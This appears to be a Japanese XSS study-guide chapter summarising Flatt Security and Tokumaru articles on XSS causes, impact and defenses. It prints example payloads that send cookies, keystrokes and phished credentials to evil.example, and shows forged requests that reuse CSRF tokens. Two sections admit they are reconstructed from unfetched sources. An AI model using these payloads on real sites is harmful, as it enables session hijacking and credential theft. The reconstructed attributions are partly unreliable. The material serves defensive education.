
> なぜバージョンが重要か: サニタイザは「既知の危険パターンを漏れなく塞ぐ」という終わりのないいたちごっこの上に成り立っている。ある年に安全だった書き方が翌年には破られる。したがって「DOMPurify を使っているから安全」は不十分で、**「どのバージョンの DOMPurify を、既知バイパスが塞がれた状態で使っているか」**まで確認して初めて意味を持つ。バージョン依存の攻撃を語るときは、対象バージョン・修正状況・公開年をセットで記録するのが鉄則である。

#### 現代的な多層防御（この記事が勧める対策）

「XSSが生まれ続ける」構造への処方箋として、この記事は単一の銀の弾丸ではなく**多層防御（defense in depth）**を勧める。

1. **安全なsinkを使う**: 可能な限り `innerHTML`／`dangerouslySetInnerHTML` を避け、`textContent`（テキストとしてのみ挿入し、HTMLとして解釈させないプロパティ）を使う。
2. **生HTML表示が本当に必要な時だけ、信頼できるサニタイザ（DOMPurify等）を最新バージョンで、DOMへ挿入する直前に適用する**。フロント／バックエンドどちらでも使える広く実績のあるOSSを選ぶ。
3. **厳格な CSP（Content Security Policy＝ブラウザにスクリプトの実行元を制限させるHTTPヘッダ）を設定する**。特に `script-src` を nonce/hash ベースにし、インラインスクリプトや `eval` を封じることで、万一注入されても実行を止める最後の砦になる。
4. **Trusted Types API を採用する**: `innerHTML` 等の危険なsinkへ「生の文字列」を代入すること自体をブラウザレベルで禁止し、専用の“信頼済み型”を経由することを強制する仕組み。React v19 では Trusted Types との統合が進み、危険なsinkの利用をより検出・制御しやすくなっている。
5. **入力を厳格な許可リストで検証する**（特にURLスキーム）。

> 出典: Still X.S.S. - なぜいまだにXSSは生まれてしまうのか？ — https://blog.flatt.tech/entry/still_xss （英語版 "Why XSS Persists in This Frameworks Era?" — https://flatt.tech/research/posts/why-xss-persists-in-this-frameworks-era/ ）。DOMPurify のバイパス／mXSS に関する補足は、cure53/DOMPurify（ https://github.com/cure53/DOMPurify ）、PortSwigger Research "Bypassing DOMPurify again with mutation XSS"（ https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss ）、Flatt Security Research "Bypassing DOMPurify with good old XML"（ https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/ ）に基づく。

---

### XSSの発生原理以外の話＝実際のリスク（Flatt Security「開発者が知っておきたい『XSSの発生原理以外』の話」）

> ⚠️ **未取得の資料**: 「開発者が知っておきたい『XSSの発生原理以外』の話」（GMO Flatt Security）は自動取得できませんでした（理由: 実行環境のエグレス・プロキシが `blog.flatt.tech`／`flatt.tech` へのアクセスをブロックしているため、記事本文を直接取得できなかった）。以下のURLからユーザーご自身で直接ご覧ください: https://blog.flatt.tech/entry/xss_risk

（以下は、取得できなかった資料の内容を、公式の記事紹介・二次資料・検索スニペット、および一般的な知識に基づいて再構成した解説です。）

#### この記事の問題意識——なぜXSSのリスクは軽視されるのか

XSSはセキュリティエンジニアにも開発者にも「よく知られた脆弱性」であり、対策の敷居も比較的低い。にもかかわらず、Webアプリの脆弱性診断で**依然として最も頻繁に検出される脆弱性の一つ**であり続けている。この記事は、その理由の一つを「**XSSのリスクが直感的に伝わっていないこと**」に求める。

診断ツールやPoC（概念実証）はしばしば `alert(1)` や `alert(document.domain)` のポップアップを出すだけで終わる。開発者はそれを見て「ポップアップが出るだけでしょ？」と実害を過小評価してしまう。そこでこの記事は**「XSSの発生原理」ではなく「XSSで実際に何ができるのか＝リスク」**に焦点を当て、`alert(1)` の“その先”を具体的に見せる。

結論を先に言えば——**XSSとは「攻撃者が被害者のブラウザ上で、そのオリジンの権限で任意のJavaScriptを実行できる」状態であり、それは実質的に「そのサイト上でそのユーザーができることは、ほぼ何でもできる」ことを意味する**。ポップアップは氷山の一角にすぎない。

#### リスク1: Cookie／セッションIDの窃取（セッションハイジャック）

最も古典的な被害。セッションID（サーバーがユーザーを識別するためにCookieに入れる識別子）を盗めば、攻撃者はそれを自分のブラウザにセットするだけで**被害者になりすましてログイン状態でアクセスできる**（セッションハイジャック）。

```js
// 画像リクエストに乗せて cookie を外部へ送る古典的手口
new Image().src = "https://evil.example/collect?c=" + encodeURIComponent(document.cookie);

// fetch でも同様に送信できる
fetch("https://evil.example/collect?c=" + encodeURIComponent(document.cookie));
```

> なぜこれが動くのか: `document.cookie` はそのオリジンのCookie（HttpOnly でないもの）をJavaScriptから読める。`Image().src` に外部URLを設定すると、ブラウザは画像を取得しようとして**攻撃者サーバーへGETリクエストを飛ばす**。クエリ文字列に載せた `document.cookie` は攻撃者のアクセスログに残る。同一オリジンポリシー（別オリジンのデータの読み取りを禁じるブラウザの基本ルール）は「リクエストの送信」自体は止めないため、この“送りつけ”は成立する。

##### 対策と、その限界: HttpOnly

Cookie に **`HttpOnly` 属性**（そのCookieをJavaScriptから読めなくする属性）と **`Secure` 属性**（HTTPS通信でしか送信させない属性）を付ければ、上記の `document.cookie` による窃取は防げる。しかし——この記事が最も強調するのはここからである。

**`HttpOnly` は「Cookieを読めなくする」だけで、「XSSそのもの」を防ぐわけではない。** JavaScriptが実行できる時点で、攻撃者はCookieを盗めなくても、次のように**被害者のセッションをそのまま利用して不正操作**できてしまう。

#### リスク2: なりすまし操作——Cookieを盗まずに「本人として」操作する

XSSが成立していれば、攻撃者のスクリプトは**被害者のブラウザ内で、被害者のログインセッションを使って**、正規のAPIを叩ける。Cookie は `credentials: 'include'` により自動で付与されるので、Cookieの中身を読む必要すらない。

```js
// 例: 攻撃者が被害者になりすまして送金/退会/権限変更などを実行する
fetch("/api/transfer", {
  method: "POST",
  credentials: "include",              // 被害者のCookieが自動で付く
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ to: "attacker", amount: 1000000 }),
});
```

> なぜこれが動くのか: スクリプトは被害者と同一オリジンで動くため、そのオリジン向けのリクエストには被害者の認証Cookieが自動的に付与される。サーバーから見れば「正規ユーザーが正規の画面から送ったリクエスト」と区別がつかない。`HttpOnly` でも `Secure` でもこれは止められない。

##### CSRFトークンも読めてしまう

「CSRF（クロスサイトリクエストフォージェリ）対策のトークンがあるから不正POSTは防げる」と思うかもしれないが、**XSS下ではCSRFトークンも読み取れる**。攻撃者スクリプトは正規ページのDOMやメタタグ、あるいはトークン発行APIからトークンを取得し、それを付けて正規リクエストを組み立てられる。

```js
// ページ内に埋め込まれた CSRF トークンを読み取ってから不正リクエストを送る
const token = document.querySelector('meta[name="csrf-token"]').content;
fetch("/api/change-email", {
  method: "POST",
  credentials: "include",
  headers: { "X-CSRF-Token": token, "Content-Type": "application/json" },
  body: JSON.stringify({ email: "attacker@evil.example" }),
});
```

> なぜこれが動くのか: CSRF対策は「攻撃者サイトから送られる偽リクエスト」を、攻撃者が知り得ないトークンで弾く仕組みである。しかしXSSでは攻撃コードが**被害者のページ内部で動く**ため、そのページに書かれたトークンを普通に読める。つまり**XSSはCSRF対策を無力化する上位互換の脅威**であり、「XSSがあればCSRF対策は前提から崩れる」。

#### リスク3: フィッシング（画面改ざんによる偽入力フォーム）

XSSでDOMを書き換えられるということは、**正規ドメイン上に、本物そっくりの偽ログインフォームやパスワード再入力ダイアログを表示できる**ということでもある。

```js
// 正規ページの中身を偽のログインフォームに差し替える
document.body.innerHTML = `
  <h1>セッションの有効期限が切れました。再度ログインしてください</h1>
  <form id="f">
    <input name="user" placeholder="ユーザー名">
    <input name="pass" type="password" placeholder="パスワード">
    <button>ログイン</button>
  </form>`;
document.getElementById("f").addEventListener("submit", (e) => {
  e.preventDefault();
  fetch("https://evil.example/steal", {
    method: "POST",
    body: new FormData(e.target),
  });
});
```

> なぜこれが動くのか: URLバー（アドレスバー）に表示されるドメインは**本物**のままなので、ユーザーは疑わない。SSL証明書の鍵マークも本物。ユーザーが「正規サイトだ」と信じてパスワードを入力すると、その値は攻撃者サーバーへ送られる。通常のフィッシング（偽ドメインへ誘導）と違い、**ドメイン詐称が要らない**ぶん、はるかに気づきにくい。

#### リスク4: キーロガー・入力値の窃取

`alert(1)` の“先”として、この記事が挙げる分かりやすい実害がキーロギング（キー入力の盗聴）である。

```js
// 被害者のキー入力をすべて攻撃者へ送るキーロガー
document.addEventListener("keydown", (e) => {
  navigator.sendBeacon("https://evil.example/k", e.key);
});
```

> なぜこれが動くのか: XSSで注入されたスクリプトはページ全体のイベントを監視できる。`keydown` を購読すれば、被害者がそのページで入力するパスワード・クレジットカード番号・メッセージ本文をリアルタイムに盗める。`sendBeacon` はページ遷移中でも確実に送信できるため、盗聴に都合がよい。フォームの `input` 監視や、`localStorage`／`sessionStorage` に保存されたトークン・個人情報の読み出しも同様に可能。

#### リスク5: 本格的な乗っ取り・内部ネットワークへの踏み台

- **ブラウザ乗っ取りフレームワーク（BeEF＝The Browser Exploitation Framework。XSSで“フック”したブラウザを攻撃者が遠隔操作するためのペネトレーションテストツール）**: 一度スクリプトを常駐させれば、攻撃者は被害者ブラウザを継続的に遠隔操作し、追加の攻撃モジュールを次々と送り込める。
- **内部ネットワークへの攻撃の踏み台**: 被害者のブラウザは、被害者の社内ネットワーク（`http://192.168.x.x` や `http://intranet.local` など）に到達できる位置にいる。XSSで乗っ取ったブラウザから内部の管理画面やルーターへリクエストを飛ばすことで、**インターネットからは直接届かない内部システムへの攻撃の起点**にできる。
- **管理者アカウントを狙う格納型XSS（stored XSS）**: 攻撃者が投稿した悪性スクリプトがサーバーに保存され、それを閲覧した**管理者**のブラウザで発火すれば、管理者権限での全ユーザー操作・設定変更・権限昇格など被害は甚大になる。

#### この記事の結論

要するに、**「XSS ＝ そのオリジンで任意のJavaScriptが実行できる」＝「そのユーザー（時に管理者）としてサイト上でできることは、事実上すべてできる」**。`alert(1)` はその能力の“最も無害な使い方”を見せているにすぎない。`HttpOnly` や CSRF トークンは被害を軽減はするが、XSSそのものを塞ぐ根本対策ではない。だからこそ、**XSSは「出力エスケープ／安全なsinkの徹底」でそもそも発生させないことが最優先**であり、Cookie属性やCSP等は「万一のときの被害を減らす多層防御」として重ねる——という位置づけを開発者が正しく理解することを、この記事は求めている。

> 出典: 開発者が知っておきたい「XSSの発生原理以外」の話 — https://blog.flatt.tech/entry/xss_risk （記事紹介ページ: https://flatt.tech/news/xss_risk/ ）。攻撃コード例と被害シナリオの補足は、二次解説（例: 「XSSはどのようにCookieを盗み、セッションを乗っ取るのか」 https://qiita.com/nozomi2025/items/9cb849ee10e0fb88c515 、NFLabs.「XSSを利用したセッションハイジャックとその対策」 https://blog.nflabs.jp/entry/2024/06/20/150000 ）に基づく一般的知識で再構成した。

---

### 徳丸浩のブログ — XSS関連の代表的記事のテーマ

> ⚠️ **未取得の資料**: 「徳丸浩の日記（ブログ）」は自動取得できませんでした（理由: 実行環境のエグレス・プロキシが `blog.tokumaru.org`／`www.tokumaru.org` へのアクセスをブロックしているため、ブログ本文を直接取得できなかった）。以下のURLからユーザーご自身で直接ご覧ください: https://blog.tokumaru.org/

（以下は、取得できなかったブログが扱っているであろうトピックについて、記事タイトル・二次言及・検索スニペット、および一般的な知識に基づいて再構成した解説です。）

徳丸浩（とくまる ひろし）は、日本のWebアプリケーションセキュリティ分野の第一人者であり、いわゆる「徳丸本」（『体系的に学ぶ 安全なWebアプリケーションの作り方』）の著者としても知られる。彼のブログ「徳丸浩の日記」は、**具体的な脆弱性の再現・検証と、正確な原理説明**を長年にわたり積み上げてきた、日本語XSS資料の“定点観測地”である。ここでは代表的なXSS関連記事を、テーマ別に紹介する。

#### (1) 「今こそXSS対策についてまとめよう」（2008年）— XSS対策の原理原則

XSS対策の考え方を体系化した古典的記事。核心は次の対比にある。

- **出力時のエスケープ（サニタイズ）＝根本的解決**。データをHTMLとして出力する“その場所（文脈）”に応じて適切にエスケープすることが本丸である。
- **入力値検証（バリデーション）＝保険的対策**。入力段階のチェックは補助であり、これだけに頼ってはいけない。

重要なのは**「文脈（コンテキスト）依存のエスケープ」**という考え方である。同じ値でも、それを置く場所によって必要な処理が変わる。

- **HTML本文**（要素の中身）: `<` `>` `&` などをHTMLエスケープする。
- **属性値**（`value="..."` の内側など）: HTMLエスケープに加え、必ず**引用符でくくり**、その引用符（`"` や `'`）自身もエスケープする。引用符で囲まないと `onmouseover=...` のような属性を差し込まれる。
- **`href`／`src` などのURL文脈**: 単なるエスケープでは不十分で、`javascript:` などの危険スキームを弾く**スキーム検証**が必要。
- **`<script>` 内やイベントハンドラ属性内（JavaScript文脈）**: HTMLエスケープではなくJavaScript文字列としてのエスケープが必要で、そもそも「ユーザー入力をJavaScriptコードの一部として出力しない」のが安全。

> なぜ「文脈依存」が肝心か: XSSの本質は「データがコード（HTML/JS/URL）として再解釈されてしまう」ことにある。ブラウザは出力先の文脈ごとに異なる文法で値を解釈するため、**一律の「HTMLエスケープ1種類」では守りきれない**。徳丸のこの整理は、現代フレームワークの自動エスケープが「HTML文脈は守るがURL文脈は守らない」（前述のFlatt記事の指摘）という構造を、原理から理解する下地になる。
>
> 出典: XSS: 今こそXSS対策についてまとめよう — https://www.tokumaru.org/d/20080822.html

#### (2) 「情報処理試験問題に学ぶJavaScriptのXSS対策」（2012年）— JavaScript文脈のエスケープ

IPA（情報処理推進機構）の試験問題を題材に、**JavaScript文脈（`<script>` 内や `on*` 属性内）に値を埋め込むときの正しいエスケープ**を解説した記事。HTMLエスケープとJavaScript文字列エスケープは別物であること、`</script>` という文字列がスクリプトを途中で終わらせてしまう罠（`<\/script>` のようにエスケープが必要）などを、試験問題という具体を通じて示す。

> 出典: 情報処理試験問題に学ぶJavaScriptのXSS対策 — https://blog.tokumaru.org/2012/04/javascript-xss-to-learn-from-ipa.html

#### (3) 「『クロスサイトスクリプティング対策』でGoogle検索して上位15記事を検証した」（2012年）— 誤った対策情報への警鐘

「XSS対策」で検索して上位に出てくる記事を実際に検証し、**世に流布する対策情報の多くが不正確・不十分である**ことを実証的に示した記事。半端なエスケープや「危険な文字を除去するだけ」といった対策の抜けを一つずつ突く。**ネットの断片的情報を鵜呑みにする危険**という、学習者への普遍的な教訓を含む。

> 出典: 「クロスサイトスクリプティング対策」でGoogle検索して上位15記事を検証した — https://blog.tokumaru.org/2012/04/google-searching-cross-site.html

#### (4) 「エラーメッセージによるXSSにご用心」（2015年）— 見落とされがちな注入点

正常系の出力だけでなく、**エラーメッセージ経由でユーザー入力が反射されてXSSになる**ケースへの注意喚起。`display_errors` を無効化していても、アプリが独自に組み立てるエラー画面に入力値をそのまま出すとXSSになりうる。「安全な出力箇所」の棚卸しが本文だけでなくエラー系にも及ぶべきことを示す。

> 出典: エラーメッセージによるXSSにご用心 — https://blog.tokumaru.org/2015/05/xss.html

#### (5) 「ISO-2022-JPの自動判定によるクロスサイト・スクリプティング(XSS)」（2024年）／「ISO-2022-JP自動判定を用いたHTMLコンテキスト破壊によるXSS」（2025年）— 文字コードを悪用したXSS

近年の徳丸ブログを代表する、**文字エンコーディング（文字コード）を悪用したXSS**の研究記事。文字コードをHTTPレスポンスで明示していないページに対し、ブラウザに**文字コードを ISO-2022-JP と“誤判定”させる**ことでエスケープ処理を回避する高度な攻撃を扱う。

仕組みを噛み砕くと次のとおり。

- **ISO-2022-JP** は7ビットの文字エンコーディングで、**エスケープシーケンス**（`ESC ( B` で US-ASCII、`ESC $ B` でJIS X 0208 の2バイト漢字集合、のように**文字集合を切り替える特別な符号**）を使う方式である。
- 攻撃者は、ページの文字コードが明示されていないことを利用して、応答の一部を ISO-2022-JP として解釈させる。すると、本来は区切り文字として機能するはずの **ダブルクォート `"` などの1バイト文字が、直前のエスケープシーケンスによって「2バイト文字の一部」として吸収され、引用符としての効果を失う**。
- その結果、`value="..."` の閉じ引用符が“消え”て属性の境界が破壊され（HTMLコンテキストの破壊）、`onmouseover=...` などを注入できてしまう。バックスラッシュ `\` が円記号として解釈される差異なども、エスケープ回避に悪用される。

> なぜこれが動くのか（仕組みのレベル）: ブラウザはページの文字コードが宣言されていないと**バイト列から文字コードを推測（自動判定）**する。攻撃者が ISO-2022-JP のエスケープシーケンスを紛れ込ませると、ブラウザの解釈系（デコーダ）が「ここから先は2バイト文字集合だ」と誤って切り替わり、開発者が“1バイトの記号”として書いたつもりの文字が別の意味に化ける。**「サーバーが出したバイト列」と「ブラウザが解釈した文字」がズレる**ことを突く点で、前述のmXSS（パース時のツリーのズレ）と同じ“再解釈のズレ”系の攻撃である。
>
> 対策はシンプルで、**HTTPレスポンスヘッダやHTMLで文字エンコーディングを常に明示する**（例: `Content-Type: text/html; charset=UTF-8` と `<meta charset="UTF-8">`）こと。これは古くからのベストプラクティスであり、これを守っていればこの攻撃の影響は受けない。
>
> 出典: ISO-2022-JPの自動判定によるクロスサイト・スクリプティング(XSS) — https://blog.tokumaru.org/2024/12/iso-2022-jp-xss.html.html ／ ISO-2022-JP自動判定を用いたHTMLコンテキスト破壊によるXSS — https://blog.tokumaru.org/2025/01/breaking-html-context-xss-by-iso-2022-jp.html

> 出典（ブログ全体）: 徳丸浩の日記 — https://blog.tokumaru.org/

---

### このセクションのまとめ（3資料の統合）

3つの日本語資料は、XSSを異なる角度から照らし、互いに補完し合う。

- **なぜ生まれるか（Flatt「Still X.S.S.」）**: モダンフレームワークはデフォルトで安全だが、`dangerouslySetInnerHTML`／`v-html` 等のエスケープハッチ、URL文脈（`javascript:`）、そして**サニタイズ後の再解釈（mXSS、Markdown連鎖、名前空間切り替え）**という抜け道からXSSは今も生まれる。サニタイザはバージョン依存でバイパスされうる（例: DOMPurify < 2.0.17 の mXSS、CVE-2024-6780 は 3.3.2 で修正、CVE-2026-41238 のプロトタイプ汚染起点）。対策は多層防御（安全なsink・最新サニタイザ・CSP・Trusted Types・URLスキーム検証）。
- **どれだけ危険か（Flatt「XSSの発生原理以外」）**: XSSは `alert(1)` ではない。Cookie窃取、なりすまし操作（`HttpOnly` でも防げない）、CSRFトークン読み取りによるCSRF対策の無力化、フィッシング（正規ドメイン上の偽フォーム）、キーロガー、BeEFによる継続的乗っ取り、内部ネットワークへの踏み台まで。**XSS＝そのオリジンでの全権掌握**であり、Cookie属性やCSPは被害軽減であって発生防止ではない。
- **原理と体系（徳丸浩）**: 根本対策は**文脈依存の出力エスケープ**、入力検証は保険。文脈（HTML本文／属性値／URL／JavaScript）ごとに正しい処理が異なる。エラーメッセージなど見落としがちな注入点、そして文字コード自動判定（ISO-2022-JP）を突く「再解釈のズレ」系の高度なXSSまで、原理から一貫して説明されている。

三者を貫く共通原理は、**「XSSとは、開発者がデータのつもりで出した文字列が、ブラウザによってコード（HTML／JS／URL）として“再解釈”されてしまう現象である」**という一点に集約される。フレームワークのエスケープハッチ、mXSSの名前空間切り替え、文字コードの誤判定——すべては「出力時の想定コンテキスト」と「ブラウザの実際の解釈コンテキスト」のズレを突いている。この“ズレ”をどこで断ち切るか（安全なsink、正しい文脈エスケープ、文字コード明示、サニタイズ位置、CSPという最後の砦）を理解することが、素朴なXSSの先へ進むための土台となる。

---

（前章: [序章](./00-introduction.md)　｜　次章: [第2章 コンテキストとペイロード](./02-context-payloads.md)　｜　[目次](./README.md)）
